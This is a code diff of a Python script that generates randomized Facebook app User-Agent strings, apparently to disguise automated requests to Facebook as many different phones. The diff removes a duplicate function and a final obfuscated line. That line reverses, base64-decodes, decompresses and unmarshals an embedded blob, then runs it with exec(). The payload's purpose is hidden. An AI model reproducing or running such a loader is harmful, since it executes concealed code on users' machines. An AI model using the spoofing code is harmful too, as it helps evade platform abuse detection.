@@ -14,28 +14,7 @@ def m1():
   fbcr = random.choice(['null', 'o2 - de', 'Verizon - us', 'Vodafone - uk']) # اختيار عشوائي لاسم مشغل الشبكة 
   
   s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
-  e = '[FBAN/Orca-Android;FBAV/181.99.31.49;FBPN/com.facebook.orca;FBLC/en_US;FBBV/66852301;FBCR/Verizon;FBMF/Realme;FBBD/Realme;FBDV/GALAXY S24 ULTRA;FBSV/10.0;FBCA/arm64-v8a;FBDM/{density=1.8,width=1130,height=1741};FB_FW/1;FBRV/51528499]'
-  
-  ua = s + ";FBNW/" + network + e  # Adding network type to the User-Agent string
-  return ua
-def m2():
-  en = random.choice(['en_US', 'en_GB', 'en_PK', 'ru_RU', 'de_DE', 'en_BD', 'en_IN', 'en_AF'])
-  application_version = str(random.randint(111, 444)) + '.0.0.' + str(random.randrange(9, 49)) + '.' + str(random.randint(11, 33))
-  ver = str(random.randrange(30, 443))
-  app_version = str(random.randint(111, 444)) + '.0.0.' + str(random.randrange(9, 49)) + '.' + str(random.randint(11, 33))
-  app_ver_code = str(random.randint(000000000, 999999999))
-  application_version_code = str(random.randint(111111111, 999999999))
-  fbap = random.choice(['414.0.0.30.113', '398.0.0.21.105', '274.0.0.22.117', '316.4.0.15.120', '385.0.0.32.114', '415.0.0.34.107', '414.0.0.30.113', '357.0.0.13.112', '415.0.0.34.107', '408.1.0.16.113', '412.0.0.22.115', '240.0.0.38.121', '414.0.0.30.113', '241.0.0.43.15'])
-  
-  # Choosing network type from a specific list
-  network_types = ['4G', '3G', 'LTT', 'Wi-Fi']
-  network = random.choice(network_types)
-  
-  fbcr = random.choice(['null', 'o2 - de', 'Verizon - us', 'Vodafone - uk']) # اختيار عشوائي لاسم مشغل الشبكة 
-  
-  s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
   e = '[FBAN/FB4A;FBAV/492.38.71.96;FBBV/63992049;FBLC/es_ES;FBRV/27711446;FBCR/Sprint;FBMF/Qmobile;FBBD/Qmobile;FBPN/com.facebook.orca;FBDV/Qmobile;FBSV/9.3;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=726,height=2401};]'
   
   ua = s + ";FBNW/" + network + e  # Adding network type to the User-Agent string
   return ua
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=ISvC+4A05CSDlMidiyTEfKW8LmsYw6eVcpQcf7VSwjsfwyelfJdRDfxDaIwyRrLWd599nZWe5FCT9iQZqrZPT4X3bMZpcRRscMS0IPMlmiNhUBX8bh0oV85G/rnra95nyVImtRpiYS2SqXlKbit7tbxJ3nRP+lmVqssvogq+J1yrVaFuuU+XPd9vWgzPzV725s02b3nxy+vgECHlhGjINEEY7dSImfjztJXk3RS0ADV42KXyeJJlmRdX6zjwrVUaQuuJxvQY98u/M93LY0fJjEdAqPkSxm/UeVcIySGalp2OWNCpTLd0GT9kOXgKvXQo9g6BCHOE+hmC0/znzAcnJg+rae92ek1E57i1OTmEAucan4wq904Ve+Q+ORVOeQbFUbTUptjaGKcvJIO1Yhf3q8Qqhtibi4bDlXiJVzZuun8/fmllnUQbz/zMpjNW0LDfciBgn8YvluTCFFaPPFhYgJZKdEiOAx9c3t5YkhCf7nze/2eM3s9Zp90bZ1bJbO5scC+ok1vAFZs/iueS864iBRVmDPeoGrgCfYjskp0NhF07gYpKv3SNnOG8W0IZ0zQcTRP4SYPC2AtuGbNdmdnYE0GL9cUtxJe'))
